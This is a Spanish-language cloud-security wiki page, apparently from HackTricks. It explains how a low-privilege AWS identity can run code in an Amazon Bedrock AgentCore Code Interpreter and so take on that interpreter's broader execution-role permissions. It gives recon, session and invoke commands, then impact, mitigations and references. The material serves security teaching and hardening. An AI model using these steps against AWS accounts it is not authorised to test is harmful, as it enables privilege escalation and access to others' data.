# AWS - Bedrock PrivEsc

{{#include ../../../../banners/hacktricks-training.md}}

## Amazon Bedrock AgentCore

### `bedrock-agentcore:StartCodeInterpreterSession` + `bedrock-agentcore:InvokeCodeInterpreter` - Code Interpreter Execution-Role Pivot

AgentCore Code Interpreter es un entorno de ejecución gestionado. Los **Custom Code Interpreters** pueden configurarse con un **`executionRoleArn`** que “proporciona permisos para que el code interpreter acceda a los servicios de AWS”.

Si un **IAM principal con menos privilegios** puede **start + invoke** una sesión de Code Interpreter que está configurada con un **rol de ejecución** más privilegiado, el llamante puede efectivamente **pivotar hacia los permisos del rol de ejecución** (movimiento lateral / escalada de privilegios dependiendo del alcance del rol).

> [!NOTE]
> Esto suele ser un problema de **mala configuración / permisos excesivos** (conceder amplios permisos al rol de ejecución del interpreter y/o otorgar acceso amplio para invoke).
> AWS advierte explícitamente evitar la escalada de privilegios asegurando que los roles de ejecución tengan **igual o menos** privilegios que las identidades permitidas para invocar.

#### Precondiciones (mala configuración común)

- Existe un **custom code interpreter** con un **execution role** sobre-privilegiado (ej.: acceso a S3/Secrets/SSM sensibles o capacidades tipo IAM-admin).
- Un usuario (developer/auditor/identidad de CI) tiene permisos para:
- start sessions: `bedrock-agentcore:StartCodeInterpreterSession`
- invoke tools: `bedrock-agentcore:InvokeCodeInterpreter`
- (Opcional) El usuario también puede crear interpreters: `bedrock-agentcore:CreateCodeInterpreter` (le permite crear un nuevo interpreter configurado con un execution role, dependiendo de los controles de la organización).

#### Recon (identify custom interpreters and execution role usage)

Lista interpreters (control-plane) e inspecciona su configuración:
```bash
aws bedrock-agentcore-control list-code-interpreters
aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id <CODE_INTERPRETER_ID>
````
> El comando create-code-interpreter admite `--execution-role-arn` que define qué permisos de AWS tendrá el intérprete.

#### Paso 1 - Iniciar una sesión (esto devuelve un `sessionId`, not an interactive shell)
```bash
SESSION_ID=$(
aws bedrock-agentcore start-code-interpreter-session \
--code-interpreter-identifier <CODE_INTERPRETER_IDENTIFIER> \
--name "arte-oussama" \
--query sessionId \
--output text
)

echo "SessionId: $SESSION_ID"
```
#### Paso 2 - Invocar ejecución de código (Boto3 o HTTPS firmado)

No existe **un shell interactivo de Python** desde `start-code-interpreter-session`. La ejecución ocurre vía **InvokeCodeInterpreter**.

**Opción A - Ejemplo Boto3 (ejecutar Python + verificar identidad):**
```python
import boto3

client = boto3.client("bedrock-agentcore", region_name="<REGION>")

# Execute python inside the Code Interpreter session
resp = client.invoke_code_interpreter(
codeInterpreterIdentifier="<CODE_INTERPRETER_IDENTIFIER>",
sessionId="<SESSION_ID>",
name="executeCode",
arguments={
"language": "python",
"code": "import boto3; print(boto3.client('sts').get_caller_identity())"
}
)

# Response is streamed; print events for visibility
for event in resp.get("stream", []):
print(event)
```
Si el intérprete está configurado con un execution role, la salida de `sts:GetCallerIdentity()` debería reflejar la identidad de ese role (no la del low-priv caller), demostrando el pivot.

**Opción B - Llamada HTTPS firmada (awscurl):**
```bash
awscurl -X POST \
"https://bedrock-agentcore.<Region>.amazonaws.com/code-interpreters/<CODE_INTERPRETER_IDENTIFIER>/tools/invoke" \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-H "x-amzn-code-interpreter-session-id: <SESSION_ID>" \
--service bedrock-agentcore \
--region <Region> \
-d '{
"name": "executeCode",
"arguments": {
"language": "python",
"code": "print(\"Hello from AgentCore\")"
}
}'
```
#### Impacto

* **Movimiento lateral** hacia cualquier acceso de AWS que tenga el rol de ejecución del interpreter.
* **Escalada de privilegios** si el rol de ejecución del interpreter tiene más privilegios que el llamador.
* Detección más difícil si los eventos de datos de CloudTrail para las invocaciones del interpreter no están habilitados (las invocaciones pueden no registrarse por defecto, dependiendo de la configuración).

#### Mitigaciones / Endurecimiento

* **Privilegios mínimos** en el `executionRoleArn` del interpreter (trátalo como los roles de ejecución de Lambda / roles de CI).
* **Restringir quién puede invocar** (`bedrock-agentcore:InvokeCodeInterpreter`) y quién puede iniciar sesiones.
* Usar **SCPs** para denegar InvokeCodeInterpreter, excepto para roles de runtime de agent aprobados (puede ser necesaria la aplicación a nivel de organización).
* Habilitar los **eventos de datos de CloudTrail** apropiados para AgentCore cuando corresponda; generar alertas sobre invocaciones inesperadas y creación de sesiones.

## Referencias

- [Sonrai: AWS AgentCore privilege escalation path (SCP mitigation)](https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/)
- [Sonrai: Credential exfiltration paths in AWS code interpreters (MMDS)](https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/)
- [AWS CLI: create-code-interpreter (`--execution-role-arn`)](https://docs.aws.amazon.com/cli/latest/reference/bedrock-agentcore-control/create-code-interpreter.html)
- [AWS CLI: start-code-interpreter-session (returns `sessionId`)](https://docs.aws.amazon.com/cli/latest/reference/bedrock-agentcore/start-code-interpreter-session.html)
- [AWS Dev Guide: Code Interpreter API reference examples (Boto3 + awscurl invoke)](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/code-interpreter-api-reference-examples.html)
- [AWS Dev Guide: Security credentials management (MMDS + privilege escalation warning)](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html)


{{#include ../../../../banners/hacktricks-training.md}}
